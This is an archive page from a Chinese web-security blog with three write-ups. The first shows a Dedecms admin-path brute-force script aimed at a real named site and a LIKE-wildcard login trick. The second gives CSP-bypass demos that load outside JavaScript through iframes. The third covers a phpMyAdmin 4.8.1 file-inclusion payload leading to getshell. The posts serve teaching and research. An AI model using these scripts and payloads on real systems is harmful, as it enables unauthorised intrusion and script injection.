<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 4 | 雨了个雨&#39;s blog</title>

  
  <meta name="author" content="雨了个雨">
  

  
  <meta name="description" content="Focus On Web Security">
  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">雨了个雨&#39;s blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/friends">Friends</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/20/dedecms-guess-admin-username-trick/"><span>Dedecms 猜后台管理员账号的一个小技巧</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/20/dedecms-guess-admin-username-trick/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-20T12:58:29.000Z">
          2018-09-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
<p>案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径,<br>然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了,<br>但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payloads &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_-&#39;</span><br><span class="line"></span><br><span class="line">menu &#x3D; &#39;&#39;</span><br><span class="line">for k in range(10):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        data &#x3D; &quot;dopost&#x3D;save&amp;_FILES[b4dboy][tmp_name]&#x3D;..&#x2F;%s%s&lt;&#x2F;images&#x2F;admin_top_logo.gif&amp;_FILES[b4dboy][name]&#x3D;0&amp;_FILES[b4dboy][size]&#x3D;0&amp;_FILES[b4dboy][type]&#x3D;image&#x2F;gif&quot;% (menu, payload)</span><br><span class="line">        res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.yx-tv.com&#x2F;plus&#x2F;rss.php&quot;, data&#x3D;data, headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;)</span><br><span class="line">        if res.content.decode(&quot;utf-8&quot;).find(&quot;Error&quot;) &gt; -1:</span><br><span class="line">            menu +&#x3D; payload</span><br><span class="line">            break</span><br><span class="line">        if payload &#x3D;&#x3D; &#39;-&#39;:</span><br><span class="line">            print(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line">print(menu)</span><br></pre></td></tr></table></figure>

<p>然后猜了下后台的管理员账户, 没猜到, admin直接提示账户不存在。<br>然后再利用之前的重置管理员密码的漏洞。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1959">https://xz.aliyun.com/t/1959</a><br>成功重置了管理员的密码, 但是修改cookie登录后, 发现显示的管理员账号是admin, 但是之前在登录后台的时候试了下admin, 是直接提示的账户不存在。<br>(好像是显示的是uname, 但是最终登录是看的userid)</p>
<p>后面发现在dede/login.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $cuserLogin-&gt;checkUser($userid,$pwd);</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  检验用户是否正确</span><br><span class="line"> *</span><br><span class="line"> * @access    public</span><br><span class="line"> * @param     string    $username  用户名</span><br><span class="line"> * @param     string    $userpwd  密码</span><br><span class="line"> * @return    string</span><br><span class="line"> *&#x2F;</span><br><span class="line">function checkUser($username, $userpwd)</span><br><span class="line">&#123;</span><br><span class="line">    global $dsql;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;只允许用户名和密码用0-9,a-z,A-Z,&#39;@&#39;,&#39;_&#39;,&#39;.&#39;,&#39;-&#39;这些字符</span><br><span class="line">    $this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br><span class="line">    $this-&gt;userPwd &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $userpwd);</span><br><span class="line">    $pwd &#x3D; substr(md5($this-&gt;userPwd), 5, 20);</span><br><span class="line">    $dsql-&gt;SetQuery(&quot;SELECT admin.*,atype.purviews FROM &#96;#@__admin&#96; admin LEFT JOIN &#96;#@__admintype&#96; atype ON atype.rank&#x3D;admin.usertype WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;&#39; LIMIT 0,1&quot;);</span><br><span class="line">    $dsql-&gt;Execute();</span><br><span class="line">    $row &#x3D; $dsql-&gt;GetObject();</span><br><span class="line">    if(!isset($row-&gt;pwd))</span><br><span class="line">    &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if($pwd!&#x3D;$row-&gt;pwd)</span><br><span class="line">    &#123;</span><br><span class="line">        return -2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $loginip &#x3D; GetIP();</span><br><span class="line">        $this-&gt;userID &#x3D; $row-&gt;id;</span><br><span class="line">        $this-&gt;userType &#x3D; $row-&gt;usertype;</span><br><span class="line">        $this-&gt;userChannel &#x3D; $row-&gt;typeid;</span><br><span class="line">        $this-&gt;userName &#x3D; $row-&gt;uname;</span><br><span class="line">        $this-&gt;userPurview &#x3D; $row-&gt;purviews;</span><br><span class="line">        $inquery &#x3D; &quot;UPDATE &#96;#@__admin&#96; SET loginip&#x3D;&#39;$loginip&#39;,logintime&#x3D;&#39;&quot;.time().&quot;&#39; WHERE id&#x3D;&#39;&quot;.$row-&gt;id.&quot;&#39;&quot;;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($inquery);</span><br><span class="line">        $sql &#x3D; &quot;UPDATE #@__member SET logintime&#x3D;&quot;.time().&quot;, loginip&#x3D;&#39;$loginip&#39; WHERE mid&#x3D;&quot;.$row-&gt;id;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($sql);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先通过用户输入的用户名查询出密码, 如果有记录的话, 就比对密码。<br>但是在这里 根据用户名查询密码的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;</span><br></pre></td></tr></table></figure>
<p>竟然是用的like。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br></pre></td></tr></table></figure>
<p>虽然在前面有把一些用户名不允许的字符给替换为空了, 想直接用%这种匹配任意数量字符的模糊查询出数据就不行了。<br>但是可以看到这个过滤没有把_替换为空。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">With LIKE you can use the following two wildcard characters in the pattern:</span><br><span class="line"></span><br><span class="line">% matches any number of characters, even zero characters.</span><br><span class="line"></span><br><span class="line">_ matches exactly one character.</span><br></pre></td></tr></table></figure>

<p>在mysql中的模糊查询中, _也代表着匹配一个任意字符。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/dede_guess_1.jpg" alt="-w1406"></p>
<p>所以在不知道管理员的用户名的情况下， 只要去用_跑一下, 当_的位数和管理员账户的位数相同时即可登录成功了。 </p>
<p>巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/"><span>CSP unsafe-inline时, 引入外部js</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/" rel="bookmark">
        <time class="entry-date published" datetime="2018-07-15T02:42:07.000Z">
          2018-07-15
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文: <a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a><br>用自己的理解, 把这个文章比较通俗的翻译补充了一下。</p>
<hr>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当csp有Unsafe-inline时, 并且受限于csp无法直接引入外部js, 当frame-src 为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。</p>
<hr>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>虽说在CSP有unsafe-inline的时候, 已经能够很轻松的把cookie给传递出去了。 但是如果想引入xss平台的js的时候, 也很麻烦。 因为xss平台的js因为功能很多, 所以通常js文件都很大, 在unsafe-inline的情况下,很可能有长度限制之类的导致没法执行到xss平台的js。 </p>
<p>CSP测试环境。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在上CSP的时候, 一些静态文件中是可能不上CSP的。并且如果这个静态文件没有 X-Frame-Options: Deny(禁止该文件被iframe)响应头的话,这个时候我们iframe去打开这个没有CSP的静态文件, iframe相当于另外打开一个窗口,因为是同源的, 然后我们操作dom往iframe新打开的窗口里写入script标签去引入外部js, 就可以无视script-src self的限制了。</p>
<p>demo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.href = <span class="string">&quot;/robots.txt&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316201005176.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316201220145.jpg"></p>
<p>成功加载了外部的js了。</p>
<p>但是如果是在nginx的配置文件中, add_header 来做csp的话,</p>
<p>那么所有静态文件中, 也会返回CSP。<br>在nginx文档中有写到,</p>
<blockquote>
<p>Directives<br>Syntax:    add_header name value [always];<br>Default:    —<br>Context:    http, server, location, if in location<br>Adds the specified field to a response header provided that the response code equals 200, 201 (1.3.10), 204, 206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0). The value can contain variables.</p>
</blockquote>
<blockquote>
<p>There could be several add_header directives. These directives are inherited from the previous level if and only if there are no add_header directives defined on the current level.</p>
</blockquote>
<blockquote>
<p>If the always parameter is specified (1.7.5), the header field will be added regardless of the response code.</p>
</blockquote>
<p>当没有设置always的时候, 如果response code为4xx或者5xx的时候, add_header 不会起作用。 那么当这个时候, 我们可以iframe引入4xx/5xx的页面, 然后往4xx/5xx的页面里面dom里插入script标签。 如果设置了always的话, 无论什么response code, 都会添加响应头。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&quot;;</span><br></pre></td></tr></table></figure>

<p>配置文件中加上add_header, csp<br><img src="http://onw16foqc.bkt.clouddn.com/15316204267818.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316205958389.jpg"></p>
<p>静态文件中也都有了csp了。<br>这里我们利用4xx页面, 4xx页面最简单的肯定就是404了。<br>当然还有一些其他触发4xx页面的方法。</p>
<p>1)超长url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">frame.src &#x3D; &quot;a&quot;.repeat(10000);</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316212060660.jpg"></p>
<p>2)超长cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    for(var i&#x3D;0;i&lt;5;i++)&#123;document.cookie&#x3D;i+&quot;&#x3D;&quot;+&quot;a&quot;.repeat(10000)&#125;;</span><br><span class="line">    var frame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">    frame.src &#x3D; &quot;a&quot;;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316214231361.jpg"><br>3)不正确的unicode路径<br>utf不存在g开头的,<br><img src="http://onw16foqc.bkt.clouddn.com/15316217028727.jpg"></p>
<p>4)<br>nginx在主目录上继续往上级目录跳的时候, 也会出现400<br><img src="http://onw16foqc.bkt.clouddn.com/15316217870523.jpg"></p>
<p>不过相比起这些4xx, 肯定404是最好找到的了。<br>不过现在404各种风格, 也有404页面的reponse code为200或者302的。 那么上面那些其他4xx的就有作用了。</p>
<p>add_header设置csp后。<br><img src="http://onw16foqc.bkt.clouddn.com/15316206301550.jpg"></p>
<p>404页面中没有csp。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> frame = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">    frame.src = <span class="string">&quot;/404notfound&quot;</span>;</span><br><span class="line">    document.body.appendChild(frame);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//xxx.com/a.js&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316207621780.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316207741758.jpg"></p>
<p>可以引入外部js了。<br>当然这种引入4xx/5xx页面的方法, 如果add_header的时候设置了always的话, 也是没办法利用的了。</p>
<p>除了iframe以外, object和embed也可以, 一样的原理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> embed = document.createElement(<span class="string">&quot;embed&quot;</span>);</span><br><span class="line">    embed.src = <span class="string">&quot;/hhhhhhh&quot;</span>;</span><br><span class="line">    document.body.appendChild(embed);</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">        script.src = <span class="string">&#x27;//cm2.in/12&#x27;</span>;</span><br><span class="line">        window.frames[<span class="number">0</span>].document.body.appendChild(script);</span><br><span class="line">    &#125;,<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://onw16foqc.bkt.clouddn.com/15316222985557.jpg"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/07/07/phpMyAdmin4-8-1-文件包含漏洞/"><span>phpMyAdmin4.8.1 文件包含漏洞</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/07/07/phpMyAdmin4-8-1-文件包含漏洞/" rel="bookmark">
        <time class="entry-date published" datetime="2018-07-07T08:58:59.000Z">
          2018-07-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>一个很简单的漏洞, 分析的文章也都出来了很多, 但是看了那些文章, 我一直搞不懂为啥问号要双重url编码, 我自己看那些文章感觉不编码应该也能成功利用的。 并且好像大家对问号编码的说法各有不同。 还是自己下载了份源码看了一下。</p>
<blockquote>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309457552552.jpg"></p>
</blockquote>
<blockquote>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309458322102.jpg"></p>
</blockquote>
<p>4.8.1下载地址:<a target="_blank" rel="noopener" href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></p>
<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在index.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; If we have a valid target, let&#39;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include($_REQUEST[&#39;target&#39;]);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以加载一些脚本。<br>直接看最后一个检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        ); <span class="comment">// $page 是我们传递进来的要包含的文件</span></span><br><span class="line">           <span class="comment">// 这里是截取到$page里?之前的文件名 并存入$_page中,</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果$_page, 在白名单之类的话, 直接通过, 所以这里我们不用双重编码也会return true.</span></span><br><span class="line">        <span class="comment">// public static $goto_whitelist = array(</span></span><br><span class="line">        <span class="comment">//      &#x27;db_datadict.php&#x27;,</span></span><br><span class="line">        <span class="comment">//      &#x27;db_sql.php&#x27;,</span></span><br><span class="line">        <span class="comment">//      &#x27;db_events.php&#x27;,</span></span><br><span class="line">        <span class="comment">//       随便从白名单的列表中选一个文件就行了。</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果双重编码, 在下面这个流程里因为解码了, 也会return true</span></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>return true了, 就直接include了。</p>
<p>直接传 db_sql.php?/../robots.txt 就能成功包含到了。<br>不需要编码, 因为这时候 include ‘db_sql.php?/../robots.txt’<br>在include中, ?号后面的字符 并不会当成query,<br>问号也就只是路径的一部分而已。  所以不需要编码, 利用/../ 也能跳出目录。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15309534675943.jpg"></p>
<hr>
<p>Getshell的话,  根据p师傅的思路,执行sql语句后, 直接包含session文件就行。</p>
